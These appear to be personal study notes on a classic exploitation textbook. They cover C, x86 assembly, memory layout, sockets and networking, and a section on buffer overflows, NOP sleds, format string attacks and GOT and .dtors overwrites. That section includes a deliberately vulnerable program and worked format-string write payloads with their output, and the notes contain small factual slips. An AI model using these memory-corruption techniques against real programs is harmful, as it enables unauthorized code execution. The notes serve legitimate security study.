# Art of Exploitation Notes
## x200 Programming
### C Basics
#### Key concepts/definitions to know:
- **Variables** - An object that can hold data
  - **Constant** - A type of variable that doesn't change
  - **Variable (Data) types**
    - **int** - stores whole numbers (2 or 4 bytes)
    - **float** - stores fractional digits can store up to 7 digits (4 bytes)
    - **char** - store single character (1 byte)
- **Pointers** - A variable that storesthe address of another variable as its value here are some key concepts as they apply to pointers and their **unary** operators
  - **Dereference/Pointer** (```*```)
    - When used in a declaration ```int* ptr``` it creates a pointer var
    - When used anywhere else is used to dereference (reference the value stored at a pointer location) ex: ```*ptr=10```
  - **Reference** (```&```) - Specifies address of a variable ex ```*ptr=&x```

- **Comments** - Comments are text in your code that do not run but should provide information about the intended use of the code, please use comments or you will forget how you did things, comments are denoted by the double backslash ```\\``` 

- **Control Structures** - Control structures are the statements that dictate the flow of execution of your code they include:
  - [**If, Else**](https://www.w3schools.com/c/c_conditions.php) - These statements dictate a decision that is made based on the result of a certain condition. ex:
    ```c
    if(you_understand_this){
        int gold_star_count = 1
    } 
    else(
        int click_if_else_hyperlink = 1
    )
    ```
    *note: despite what people tell you, use the braces ```{}``` in your if statements even if its only one line*
  - [**While**](https://www.w3schools.com/c/c_while_loop.php) - Keeps looping a block of code until a condition is reached ex:
    ```c
    while(you_dont_understand_this){
        click_while_hyperlink = 1
        you_dont_understand_this = 0
    }
    ```
    *note: always make sure to include something to trip the condition so you can exit the loop*
  - [**For**](https://www.w3schools.com/c/c_for_loop.php) - Used for when you want to execute a code block for a defined number of intervals ex:
    ```c
    for(iterator=0;iterator<5;iterator++){
        print("Printing this line")
    }
    ```
  - [**Break/Continue**](https://www.simplilearn.com/tutorials/cpp-tutorial/break-and-continue-statements-cpp) - Both can be used to exit a loop but the behavior is a bit different for each
    - Break: Stops the entire process of the loop
    - Continue: Only stops the current iteration 
- [**Functions**](https://www.w3schools.com/c/c_functions.php) - Used to perform a repetitive and uniform action multiple times with out rewriting code. The function is comprised of:
  - The prologue which includes function return type, name of function, and parameters ex:
    ```c
    void make_sandwich(char *bread, char *meat, char* cheese){
        //make the sandwich
    }
    ```
    *Note: The ```void``` data type is used in situations like this where you dont expect return data*  
  - The actual code you intent to execute, which should be nested within the brackets ```{}```
  - The return value, which is data you intend to pass back to the calling function. This will be denoted with the ```return``` keyword. *Note: please ensure your return value is the same type as your function prologue* 

- <details> 
    <summary><strong>Arithmetic operators</strong></summary>
    <strong>Arithmetic operators</strong> - Allows you to do mathematical operations on two operators
    <table class="tg">
    <thead>
    <tr>
        <th class="tg-g7sd">Full Expression</th>
        <th class="tg-yla0">Shorthand</th>
        <th class="tg-yla0">Explanation</th>
    </tr>
    </thead>
    <tbody>
    <tr>
        <td class="tg-cly1">i = i + 12</td>
        <td class="tg-cly1">i+=12</td>
        <td class="tg-cly1">Add some value to the variable.</td>
    </tr>
    <tr>
        <td class="tg-cly1">i = i - 12</td>
        <td class="tg-cly1">i-=12</td>
        <td class="tg-cly1">Subtract some value from the variable.</td>
    </tr>
    <tr>
        <td class="tg-cly1">i = i * 12</td>
        <td class="tg-cly1">i*=12</td>
        <td class="tg-cly1">Multiply some value by the variable.</td>
    </tr>
    <tr>
        <td class="tg-cly1">i = i / 12</td>
        <td class="tg-cly1">i/=12</td>
        <td class="tg-cly1">Divide some value from the variable.</td>
    </tr>
    </tbody>
    </table>
    </details>

- <details> 
    <summary><strong>Equivalency Operators</strong></summary>
    <strong>Equivalency Operators</strong> used to compare two operators ex:
    <table class="tg">
    <thead>
    <tr>
        <th class="tg-g7sd">Condition</th>
        <th class="tg-yla0">Symbol</th>
        <th class="tg-yla0">Example</th>
    </tr>
    </thead>
    <tbody>
    <tr>
        <td class="tg-cly1">Less than</td>
        <td class="tg-cly1">&lt;</td>
        <td class="tg-cly1">(a &lt; b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Greater than</td>
        <td class="tg-cly1">&gt;</td>
        <td class="tg-cly1">(a &gt; b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Less than or equal to</td>
        <td class="tg-cly1">&lt;=</td>
        <td class="tg-cly1">(a &lt;= b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Greater than or equal to</td>
        <td class="tg-cly1">&gt;=</td>
        <td class="tg-cly1">(a &gt;= b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Equal to</td>
        <td class="tg-cly1">==</td>
        <td class="tg-cly1">(a == b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Not equal to</td>
        <td class="tg-cly1">!=</td>
        <td class="tg-cly1">(a != b)</td>
    </tr>
    </tbody>
    </table>
    </details>

- <details>
    <summary><strong>Logic Operators</strong></summary>
    <strong >Logic Operators</strong> - used to chain together operators
    <table class="tg">
    <thead>
    <tr>
        <th class="tg-g7sd">Condition</th>
        <th class="tg-yla0">Symbol</th>
        <th class="tg-yla0">Example</th>
    </tr>
    </thead>
    <tbody>
    <tr>
        <td class="tg-cly1">Less than</td>
        <td class="tg-cly1">&lt;</td>
        <td class="tg-cly1">(a &lt; b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Greater than</td>
        <td class="tg-cly1">&gt;</td>
        <td class="tg-cly1">(a &gt; b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Less than or equal to</td>
        <td class="tg-cly1">&lt;=</td>
        <td class="tg-cly1">(a &lt;= b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Greater than or equal to</td>
        <td class="tg-cly1">&gt;=</td>
        <td class="tg-cly1">(a &gt;= b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Equal to</td>
        <td class="tg-cly1">==</td>
        <td class="tg-cly1">(a == b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Not equal to</td>
        <td class="tg-cly1">!=</td>
        <td class="tg-cly1">(a != b)</td>
    </tr>
    </tbody>
    </table>
    </details>

- **Typecasting** - Typecasting ig s way to temporarily change the tyoe of a variable ex: ```(float) [variable]```
    - Make sure to include an ```*``` after the type if youre typecasting a pointer because youre saying its a pointer to this var ex ```(int*) [pointer_variable]``` [ref](https://ecomputernotes.com/what-is-c/function-a-pointer/type-casting-of-pointers)

    - Doing arithmetic on typecasted pointers (assuming youre trying to effect the underlying value) is a bad idea unless you change it to the expected value first and then back to its typecasted self ex: ```int_pointer = (char *) ((int *) int_pointer + 1)```
        - void pointers must be typecasted before arithmetic
        - void pointers cant be de-referenced
- **User Input** 
  - ```scanf``` -  to include user input as a part of your program you will need to use this function, scanf expects its arguments to be pointers so you should either use one ot use a unary (address of) operator to a varable ```&``` ex ```scanf(%d, &[VARIABLE])```
    - if you want to grab user input but you also need spaces you can use a scanset char ```[]``` which says "read only" the trick is to combine with a not operator ```^``` to make it act as"read until" ex:  ```scanf("%[^\n]s", [variable])``` this will take all user input until a newline is sent into one string.   
  - **Via Args** - In order to take user input via arguments in C, you need to include two variables into your main function, (1) Your argument count (2) an arg list in a character array. ex ```int main(int argument_count, char *arg_list[])```
- **Variable Scoping** - it is important to understand the scope of your variables as they dictate what data is available to your current function during a specific point in execution there are 3 specific scopes you need to worry about:
  - **Global** - Global variables are variables defined outside of the main function that persist across all functions 
    - You can use the ```#define``` directive to set global constants
  - **Static** - They remain local to a specific function but their value remains intact across functions <details><summary>ex</summary>
        ```

        #include <stdio.h>

        int function()
        {
            static int count = 0;
            count++;
            return count;
        }

        void main(){
            print("%d", function);
            print("%d", function);
        }
        // will output 1 2 instead of 1 1
        ```
    </details>

  - **Local** - variable context is local to a function and is lost when the function leaves
  - **Structs** - these are kind of like classes in that they can hold multiple variables which can be held by a struct and referenced as such. Theres 3 different ways to access elements in a struct
    - The sensible way (Direct access): ```[Struct].[element]```
    - Via a pointer to the struct (arrow operator): ```[pointer]->[element]```
    - Typecasting the pointer then dereferencing the value out (assuming you know how the data is store in memory): ```*((int *) [pointer])```
  
#### Best Practices 
  - All of the primary functionality should be integrated in the ```main()``` function
  - add newlines at the end of your code to avoid include errors
  - always terminate statements with a ```;```
#### Things to remember
  - When the filename for a #include is surrounded by < and >, the compiler looks for this file in standard include paths, such as /usr/include/. If the filename is surrounded by quotes, the compiler looks in the current directory.
  - strings are just character arrays, to avoid having to add them one at a time, use strcpy ex ```strcpy([var], "Hello World!");``` but make sure that the string can fit in the allocated buffer for that variable (we'll talk more about why later)
  - ***Fortmat strings*** - in C you can use ```printf()``` to pring variables in a non-sting form ex: ```printf("Include example variable here: %s", [variable])```
    - ```%d``` Decimal
    - ```%u``` Unsigned decimal
    - ```%x``` Hexadecimal
    - ```%s``` String
    - ```%n``` Number of bytes written so far
    - ```%p```  Memory Address
- You can pad a number with 0s by prepending a format string with a number ex ```03%d```


### Assembly
All C programming is further translated to assembly code which is a lower level and somewhat human readable representation of the eventual machine code that is interpreted by the computer.
#### Key concepts/definition to know
- Assembly is syntax formatted ```operation, [destination], [source]``` 
- There are two major syntaxes for assembly, AT&T and Intel (Intel is a lot cleaner)
    - To set GDB to intel reference [GDB](https://github.com/adminprivileges/skillbridgreNotes/blob/main/terminal_tools.md#gdb)
- <details>
  <summary><strong>Registers</strong> - a register is a small bit of memory that sits inside the CPU. and is used by assembly language to perform various tasks. </summary>

    - ```EAX``` (Accumulator register): It is used for I/O port access, arithmetic, interrupt calls, etc
    - ```EBX``` (Base register): It is used as a base pointer for memory access. Gets some interrupt return values
    - ```ECX``` (Counter register): It is used as a loop counter and for shifts. Gets some interrupt values
    - ```EDX``` (Data register): It is used for I/O port access, arithmetic, some interrupt calls.
    - ```EDI``` (Destination index):Used for string, memory array copying and setting and for far pointer addressing with EDI
    - ```ESI``` (Source index): Used for string and memory array copying
    - ```EBP``` (Stack Base pointer): Holds the base address of the stack
    - ```ESP``` (Stack pointer): Holds the top address of the stack
    - ```EIP``` (Index Pointer): Holds the offset of the next instruction. It can only be read
  </details>

- x86 processor values are stored in little-endian (least sig byte first) byte order which means the byte values ```0xc7    0x45    0xfc    0x00``` would be stored in a word as ```0x00fc45c7```

- <details>
    <summary>Compiled program memory is broken into 5 segments:</summary>
    - **Text:** (Code Segment), where the assembly instructions are located. 
        - Read Only

    - **Data:** used to store initialized global and static variables
        - Writable, but fixed in size
    - **BSS:**  used for uninitialized g&s variables
        - Writable, but fixed in size
    - **Heap:** directly controlled by the programmer, writes downward towards higher memory addresses
      - ```malloc()``` and ```free()``` are used to allocate and deallocate space in the heap respectively
        - malloc returns a pointer with the datatype void so it must be typecasted to its expected type
    - **Stack:** used to store local function variables and context during function calls (what ```bt``` looks at) grows upards towards lower memory
  </details>
- **Function Calls** - function calls have three important parts which are the **function prologue**, the **function call** and the **function epilogue**  
  - **Function Prologue**:
    - Pushes EBP to the stack so that it can be restored to its place in the calling function later ```push ebp```
    - The value of the base pointer is set to the address of the ESP (top of the stack) ```mov ebp, esp```
    - ESP gets moved to create memory space for the local variables ```sub esp, 15``` 
  - **Function call**:
    - pushes the function arguments to the stack (in reverse order)
    - Pushes return address (the next instruction) to the stack 
  - **Function epilogue**  
    - Drops stack pointer to the base pointer ```mov esp, ebp```
    - pops base pointer off the stack to be restored to its previous value ```pop ebp```
    - calls the return function which places the return address in EIP to run it next ```ret```
  - ![Stack](https://learning.oreilly.com/api/v2/epubs/urn:orm:book:9781593271442/files/httpatomoreillycomsourcenostarchimages254229.png.jpg)
#### Things to remember
- As a program executes, the EIP is set to the first instruction in the text segment. The processor then follows an execution loop that does the following:
  - Reads the instruction that EIP is pointing to
  - Adds the byte length of the instruction to EIP
  - Executes the instruction that was read in step 1
  - Goes back to step 1

### File I/O
In C files are handled by 2 different ways file descriptors and file streams. File descriptors are the preferred method as they use lower level I/O functions. 
- There are four common functions that use file descriptors 
  - ```open()```: Opens a file and returns file descriptor
    - requires ```<fcntl.h>``` and ```<sys/stat.h>``` to be included to use flags
    - Open flags include:
      - ```O_RDONLY``` Open file for read-only access.
      - ```O_WRONLY``` Open file for write-only access.
      - ```O_RDWR``` Open file for both read and write access.
      - ```O_APPEND``` Write data at the end of the file.
      - ```O_TRUNC``` If the file already exists, truncate the file to 0 length.
      - ```O_CREAT``` Create the file if it doesn't exist.
        - ```S_IRUSR``` Give the file read permission for the user (owner).
        - ```S_IWUSR``` Give the file write permission for the user (owner).
        - ```S_IXUSR``` Give the file execute permission for the user (owner).
        - ```S_IRGRP``` Give the file read permission for the group.
        - ```S_IWGRP``` Give the file write permission for the group.
        - ```S_IXGRP``` Give the file execute permission for the group.
        - ```S_IROTH``` Give the file read permission for other (anyone).
        - ```S_IWOTH``` Give the file write permission for other (anyone).
        - ```S_IXOTH``` Give the file execute permission for other (anyone).
  - ```close()```: fd is the only arg
  - ```read()```: 
  - ```write()```: combine with int (usually ```strlen``` to know how much to write) 

## x300 Exploitation
### Buffer Overflow
#### Key concepts/definitions to know
- **Buffer Overflow** - When data written into a buffer (an allocation of memory) overides the boundaries of said buffer and spills into adjacent memory locations.
  - When data is overwritten it flows to higher addresses (remember, the stack grows to lower addresses)
- In a function, since data is placed on the stack in reverse order, variables defined before other variables are susceptible to being overwritten.
  - <details><summary>ex:</summary>
    ```c
    void main(){
      int var1;
      char var2[20];
    }
    ```
    *Note: In this scenario, if more than 20 bytes are written into the var2 character buffer, the remainder could overflow into var 1*
    </details>

- Because of this same concept, the lack of input validation can also lead to execution flow control if a hacker can overflow user-defined data into the return address
  - ![pic](https://www.mkdynamics.net/current_projects/computer_security/images/Basic_Linux_exploits/buffer_overflow_image.jpeg) 
  - When overflowing a buffer, there are two ways you can find the offset from the variable you control to the return address. You can 
    - Use an ever growing input repeating your return address until youre sucessful (Easier with command line argument stuff).
    - Use ```msf-pattern_create``` to make a unique byte array to overflow your return address and then ```msf-pattern_offset``` to find the specific size (Easier if your debugging info is more robust)
      - <details>
  
        ```bash
        msf-pattern_create -l 800 #will create a 800m byte buffer
        msf-pattern_offset -l 800 -q [RETURN_POINTER_VALUE] #will take the value from your return pointer ant tell you the offset from your variable
        ```
        </details>
- The ```strcpy()``` function alone does not institute input validation, and without it can make programs susceptible to overflow attacks
### NOP Sleds
- One of the most famous types of a buffer overflow exploit is the NOP (No Operation) Sled. In this technique, the hacker tries to land the return address to a range of memory addresses that feed sequentially into desired shellcode. Check out [this](https://www.coengoedegebure.com/buffer-overflow-attacks-explained/) link for a full rundown.
- There Are three major parts to this exploit all equally as important.
![exploit](https://learning.oreilly.com/api/v2/epubs/urn:orm:book:9781593271442/files/httpatomoreillycomsourcenostarchimages254213.png.jpg)
  - **NOP Sled** - A single byte assembly instruction that does absolutley nothing and pushes you to the next instruction.
  ![Sled](https://www.coengoedegebure.com/content/images/2018/08/nopsled_slide.png)
  - **Shell Code** - These can come in all different flavors, but by in large they are some form of command line invocation (usually just executes /bin/sh)
  - **Return Address** - The return address redirects the executino flow to land somewhere within the NOP sled.  
- While predicting a location in memory to point to in order to hop on the sled can be a bit difficult with a dynamically changing stack, one trick is to use a predictable memory location such as th address of a function call argument (since these will always be before the rest of the stack frame, just make sure your sled isnt big enough to override these too) and subtract an offset in order to find a spot within the sled, this may take trial and error but you can automate it with a bit of scripting. ex:
  - ``` 
    ret = (unsigned int) &i - offset; // Set return address.
    ```
### Environmental Variables
- In some situations you may be dealing with a buffer that is too small for you to include a large NOP sled and  in the offset between your variable and the return pointer. In this case we have to be a bit more cognizant about the space we occupy. Thankfully shellcode can be placed in more locations than just the stack frame of this particular function.
- It is important to note that user environment variables are stored on the stack as well and when a program is run under the context of a specific user (even if it has suid root privileges) the stack will contain that specific users environment variables, this location is static but can shift a bit given certain factors such as the program's name
  -  To combat this, you can either use a NOP sled, or predict where this location will be. Thankfully this is easier with the ```getenv()``` function (with a few tweaks) 
     -  <details> <summary>getenvaddr.c</summary>
        
        ```c
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>

        int main(int argc, char *argv[]) {
          char *ptr;

          if(argc < 3) {
              printf("Usage: %s <environment var> <target program name>\n", argv[0]);
              exit(0);
          }
          ptr = getenv(argv[1]); /* Get env var location. */
          ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
          printf("%s will be at %p\n", argv[1], ptr);
        }
        ```
        *Note: There is a two byte difference in environmental variable location per one byte of program name increase*
      </details>

### Heap Overflows
- The main thing of note in heap based overflow attacks is that these are going to be largely focused on overriding certain variables to control program functionality rather than execution flow.
  - This simply means that the end goal of the exploits are going to be largely dependant on the functionality of thr program. 
-  In the context of this book, while the heap may be dynamically allocated, variables that reside int he heap are sequential in nature and can be overwritten into one another.  
-  Since the heap grows Higher into increased memory addresses, variables overflow in the order in which they are initialized in the program. 
### Function Pointer Overflow
- Function pointers, like any other variable can be overflowed, when a function pointer is referenced in a variable initialization in something like a struct, or even another function, the rules of regular buffer overflow still apply, if you can find the offset of the two variables and use input to overflow and override  a function pointer, you can control execution flow when it comes time for that function pointer to be referenced.
- ```nm``` can be used to list the addresses of various functions in a program in case you want to call a seperate function versus using shellcode. 
### Format Strings
We reference format strings [earlier](https://github.com/adminprivileges/skillbridgreNotes#things-to-remember) in the notes, but what we fail to mention is the fact that ther are stored alongside the variable in the stack when a ```printf()``` function is called. To learn more about this, check out [this link](https://axcheron.github.io/exploit-101-format-strings/) . 
- Since format strings are stored on the stack, if proper input control validation isn't exercised, then the address of the format string can be overflowed leading to arbirtary memory read and write capabilities.
- Similar to ```scanf()```, ```printf``` has the ability to be abused to allow for overflow without proper input validation. 
  - The biggest countermeasure for this is to only accept input in the form of a format string to ensure that ```printf()``` interprets the totality of the argument it is sent as one contiguous string. This is done by using ```printf(%, [VARIABLE])``` instead of ```printf([VARIABLE])``` .
    - <details><summary>fmt_vuln.c</summary>

        ```c
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>

        int main(int argc, char *argv[]) {
          char text[1024];
          static int test_val = -72;

          if(argc < 2) {
              printf("Usage: %s <text to print>\n", argv[0]);
              exit(0);
          }
          strcpy(text, argv[1]);

          printf("The right way to print user-controlled input:\n");
          printf("%s", text);


          printf("\nThe wrong way to print user-controlled input:\n");
          printf(text);

          printf("\n");

          // Debug output
          printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, 
        test_val);

          exit(0);
        }
        ```
    </details>

    - <details> <summary>example output</summary>

        ```
        reader@hacking:~/booksrc $ ./fmt_vuln testing %x
        The right way to print user-controlled input:
        testing%x
        The wrong way to print user-controlled input:
        testingbffff3e0
        ```
        *Note: In the same way that ```testing %x``` can be used to examine the next memory address, this can be repeated indefinitely to read stack memory*
    </details>
#### Writing to a buffer
- Just like data can be read from memory using format strings, it can be written using them as well. The ```%n``` format string is used to write the ammount of bytes written so far. If we can influence the data written so far, we can effectively write to a memory address that we control, the intended variable.
  - In order to find the offset from the the format string buffer to tthe intended variable you can place a predictable string (like AAAA) and pair it with a multitude of repeated format strings (```%x```) until  
- Data can be written to our intended variable in one of two ways
  - Manipulating the field width of your format strings for 4 consecutive writes, using regular format strings that reference sequential bits of memory with 4 byte offsets. Unfortunately you can only influence one byte at a time with this method resulting in you having to run the program 4 times back to back slowly incrementing the memory address. All in all, the operation will look something like this (for 4 times):
    - <details>
    
      ```
      reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%126x%n
      The right way to print user-controlled input:
      ??JUNK??JUNK??JUNK??%x%x%126x%n
      The wrong way to print user-controlled input:
      ??JUNK??JUNK??JUNK??bffff3c0b7fe75fc
      0
      [*] test_val @ 0x08049794 = 170 0x000000aa 
      ```
    </details>
  - Using Direct parameter access to simplify the above method for simpler, single execution writes (which i do understand so im going to explain).
    -  <details><summary>Reading</summary>

          Its a bit easier to explain writing if i explain reading first. In the same  way that ```./fmt_vuln AAAA%x%x%x%x``` can read ```AAAA...41414141```, ```./fmt_vuln AAAA%4\$x``` can be used to read ```AAAA41414141``` it does so by asking for the Nth occurence of a sequence with the special character ```$``` (which needs to be escaped since we are using this in the context of bash as an argument. ```%4/$x == %4$x```  which translates to the 4th occuence of the 4 byte hexadecimal sequence. 
          ```
          reader@hacking:~/booksrc $ ./fmt_vuln AAAA%x%x%x%x
          The right way to print user-controlled input:
          AAAA%x%x%x%x
          The wrong way to print user-controlled input:
          AAAAbffff3d0b7fe75fc041414141
          [*] test_val @ 0x08049794 = -72 0xffffffb8
          reader@hacking:~/booksrc $ ./fmt_vuln AAAA%4\$x
          The right way to print user-controlled input:
          AAAA%4$x
          The wrong way to print user-controlled input:
          AAAA41414141
          [*] test_val @ 0x08049794 = -72 0xffffffb8 
          reader@hacking:~/booksrc $
          ```

       </details>
    - Writing: To write data you must first read the data inside the memory address you would like to write too, you can do so by effectivey "zeroing" (or as close to it) the value, and then doing a little bit of math to rewrite the address.
      - <details><summary>Ex</summary>

          Using the example from the book. The intent is to change the address of tets_val to ```0xbffffd72```. First we hav to clear our the current value. 
          ```c
          reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08". "\x96\x97\x04\x08" . "\x97\x97\x04\x08"')%4\$n
          The right way to print user-controlled input:
          ????????%4$n
          The wrong way to print user-controlled input:
          ????????
          [*] test_val @ 0x08049794 = 16 0x00000010

          ```
          This changes overrides the memory location and changes the value to 16 bytes which is the value of the 4 words. Next we can do some math to calculate the number of bits that need to be written for each byte of the memory address. This is done by starting with the 16 bytes and then calculating the offsets for each following byte via subtraction
          ```
          reader@hacking:~/booksrc $ gdb -q
          (gdb) p 0x72 - 16
          $1 = 98
          (gdb) p 0xfd - 0x72
          $2 = 139
          (gdb) p 0xff - 0xfd
          $3 = 2
          (gdb) p 0x1ff - 0xfd
          $4 = 258
          (gdb) p 0xbf - 0xff
          $5 = -64
          (gdb) p 0x1bf - 0xff
          $6 = 192
          (gdb) quit
          ```
          With these offsets in mind, starting with ```%98x%4\$n``` we should be able to build a string that will override the entire memory address in one call.that will look something like
          ```
          reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08". "\x96\x97\x04\x08" ."\x97\x97\x04\x08"')%98x%4\$n%139x%5\$n%258x%6\$n%192x%7\$n
          The right way to print user-controlled input:
          ????????%98x%4$n%139x%5$n%258x%6$n%192x%7$n
          The wrong way to print user-controlled input:
          ???????? 
                                                                          bffff3b0
                                                          b7fe75fc
                                      0
                                            8049794
          [*] test_val @ 0x08049794 = -1073742478 0xbffffd72
          ```
        </details>   

### Destructors (.dtors)
In C objects (to include functions like main) are paired with constructors and destructors which allocate and release resources when objects come in and out of scope. If these are not user defined, the compiler will simply choose the defaults. Functions can be defined as destructors by specifying the attribute in the function prototype ex: 
```c
static void cleanup(void) __attribute__ ((destructor));
```
Using the ```nm``` command, we can inspect the destructors, the addresses to these functions are stored sequentially in the stack, beginning at ```__DTOR_LIST__``` and ```__DTOR_END__``` these addresses should hold the values of```0x00000000``` and ```0xffffffff``` respectively. If no user defined destructors exist, these memory addresses will only be 4 bytes apart, otherwise a pointer to a user defined destructor will reside here. *Note: you can also use ```objdump``` to just print the destructor table.
```
reader@hacking:~/booksrc $ objdump -s -j .dtors ./fmt_vuln

./fmt_vuln:     file format elf32-i386

Contents of section .dtors:
 8049690 ffffffff 00000000 
```
It is important to note that the destructors table is writable (if you want to fact check me, run a ```objdump -h``` on a file and notice the lack of a READONLY attribute) given this fact if we have a program that runs under root privileges we can combine this with other techniques such as format string/buffer overflow exploits to control execution flow.
### Global Offset table
The global offset table along eith the procedure linkage table are used to convert position independent addresses to absolute locations (or in engligh it stores dynamic memory locations in static predictable pointers). This is important to understand because this is how programs reference essential functions such as ```exit()```. More importantly, the GOT is writable, which means again, we can influence program execution flow if we override these pointers. To inspect the address of these pointers you can inspect dynamic resolution entries of the GOT using ```objdump``` ex:
```
reader@hacking:~/booksrc $ objdump -R ./fmt_vuln

./fmt_vuln:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049764 R_386_GLOB_DAT    __gmon_start__
08049774 R_386_JUMP_SLOT   __gmon_start__
08049778 R_386_JUMP_SLOT   __libc_start_main
0804977c R_386_JUMP_SLOT   strcpy
08049780 R_386_JUMP_SLOT   printf
08049784 R_386_JUMP_SLOT   exit
```

## x400

### OSI Model
In oder for computers to be able to talk to one another, they need tp speak the same language. Due to the million different reasons that computers need to talk to each other there are another million protocols to somewhat uniformly control how the communications traverse across networks. 

In order to make this more modular the OSI model was created as a conceptual model for these standards to adhere to in order to facilitate information flow. This model is made of 7 layers as follows:
1. **Physical Layer** - Deals with transmitting a raw bit stream over a physical medium (turning something like light or electricity into data).  
   - Devices at this layer include cables like coax and fiber, but can also be frequencies and EM pulses for wireless communications  
2. **Data Link Layer** - Deals with transferring data from one device to another in frames within a broadcast domain. Error checking and flow control are added at this layer to make dataflow practical in modern application (focuses on getting information from one device to its neighbor). 
   - Devices at this layer include switches. 
3. **Networking Layer** - Deals with connecting broadcast domains to one another to facilitate wide area networks (makes big networks out of smaller networks).
   - Devices at this layer include routers  
4. **Transport Layer** - deals with enabling reliable networks, ensures complete data transfers and provides additions such as volume and rate control (helps data move more efficiently). 
5. **Session Layer** - Deals with maintaining sessions between networked applications (controls the conversation). 
6. **Presentation Layer** - responsible for ensuring the data is presented in a usable format, also where encryption happens
7. **Application Layer** - Allows applications to access networked services. 
When your data is moved over the internet, layers 1-3 facilitate actually getting your data from point a to point b. Layers 4-7 enable the underlying communication between the computers to occur in a uniform fashion.   
### Sockets
#### Key concepts/definitions to know
- **Sockets** - the pairing of an IP address with a Port, or otherwise a connection endpoint. This happens at layer 5 although it influences the structure of layer 4. 
- There are two kinds of sockets
  - Stream Sockets: Used for TCP
  - Datagram Sockets: Used for TCP
- A socket behaves a lot like a file descriptor, and can be interacted with using ```read()```  and ```write()``` a function to create a socket fd looks like this:
  - ```
    socket(int domain, int type, int protocol)
    ```
    - ```domain``` - protocol family of the socket (ex: ```pf_inet, pf_ax25```)
    - ```type``` - type of socket (ex: ```sock_stream, sock_dgram```)
    - ```protocol``` - choose a protocol within the family (most families only have 1 so this is usually set to ```0```)
- **Connecting** sockets is done via pairing the descriptor created in the function above with a remote host. The function to do so looks like this:
  - ```
     connect(int fd, struct sockaddr *remote_host, socklen_t addr_length) 
    ```
    *Note: ```socklen_t``` is a data type for an unsigned 32bit int for a network address*
-  **Binding** sockets is done via pairing a sockets with a local address in order to listen to connections. The function looks like this:
   -  ```
        bind(int fd, struct sockaddr *local_addr, socklen_t addr_length)
      ``` 
    - To **listen** for connections you must use the following function, which ques requests up to ```backlog_queue_size```
      - ```
          listen(int fd, int backlog_queue_size)
        ```
    - To **accept** a connectiona bound socket must be paired with a remote host as well as the size off the address structture 
      - ```
          accept(int fd, sockaddr *remote_host, socklen_t *addr_length)
        ```
  - Sending and recieving are done via similar functions using the socket fd where ```n``` is the number of bytes sent or recieved
    - ```
      send(int fd, void *buffer, size_t n, int flags)
      recv(int fd, void *buffer, size_t n, int flags)
      ```
    
  - All of these functions should return a ```-1``` if an error occurs which can be used in an if statement for error checking if the output is ```== -1```
  - Many of these functions reference a ```sockaddr``` struct. This struct contains the infomration necessary to define a host given that there are many different ways a single host can be addressed depending on the protocol
     - ```SOCKADDR_COMMON``` is an unsigned int used to represent the family of addresses along with the rest of the strcture for its saved data .
     - These different sockaddr structures are all the same size allowing for them to be typecasted into one another. 
#### AF_INET
- ```AF_INET``` is the address family under the ```PF_INET``` protocol family, Together this pair reporesent IPv4. THe address structure shown in the ```netinet/in.h``` file is as shown
  - ```
      /* Structure describing an Internet socket address.  */
      struct sockaddr_in
        {
          __SOCKADDR_COMMON (sin_);
          in_port_t sin_port;     /* Port number.  */
          struct in_addr sin_addr;    /* Internet address.  */

          /* Pad to size of 'struct sockaddr'.  */
          unsigned char sin_zero[sizeof (struct sockaddr) -
              __SOCKADDR_COMMON_SIZE -
              sizeof (in_port_t) -
              sizeof (struct in_addr)];
         };
    ```
    ![struct](https://learning.oreilly.com/api/v2/epubs/urn:orm:book:9781593271442/files/httpatomoreillycomsourcenostarchimages254410.png.jpg)
    - ```SOCKADDR_COMMON``` in this context defines our address family (IPv4)
    - Next is the port which is a 16 bit short between 0-FFFF
    - next is a 32 bit IP address
    - Lastly, 8 bits pad out the rest of the address
      - *Note: The host and network addresses in this struct are expected to be in big endian order regardless of architecture so there are translation functions to ensure this is done as such*
        - ```htonl(long value)``` - Host-to-Network Long
        - ``` ntohl(long value)``` - Network-to-Host Long
    - Since these structs are a bit different from the simple IP addresses we use there are a couple different functions that deal with translation of an ascii string representation of an IP address to an in_addr struct they are.
      -  ```inet_aton(char *ascii_addr, struct in_addr *network_addr)```
      -  ```inet_ntoa(struct in_addr *network_addr)```

### Traffic Headers
Traffic must movr in a uniform manner to ensure that it is properly handled over the internet which necessitates standards for routable traffic. Traffic at the lower layers by nature is unencrypted to facilitate transportation from one endpoint to another and because of so we can take a look at what these headers look like and what role they play in ensuring data is transported over the internet. Since each layer plays a distinct part, we'll split this up by layer. 

#### Physical
Hopefully you never have to deal with anythinh this low on the totem pole, but layer 1 and 2 co-inside with one another and this field is often overlooked because its to small and nice, but at later 1 there are two important things in a frme.
  - **Preamble** - The preamble is a 7 octes (56 bits) pattern of 1s and 0s that allows networked devices to syncronoze their recivever clocks allowing bit-level syncronization. 
  - **Start Frame Delimiter** - An 8 bit value that marks the end of the preamble and th begninning of the layer 2 frame. 
Since Physical layer Tranciever circuityu is required to connect the MAC to a physical medium (your NIC) a bus from the media independent interface family is required to define the structure of your function preamble. Different chips use different busses (F/E uses MII, but GbE uses GMII). 
#### Data Link
This are the traditional frames youre used to looking at if youre looking at LAN traffic. At the layer 2 level, the ethernet frame is a small header composed of a few minor parts to pass traffic to neighbors. 
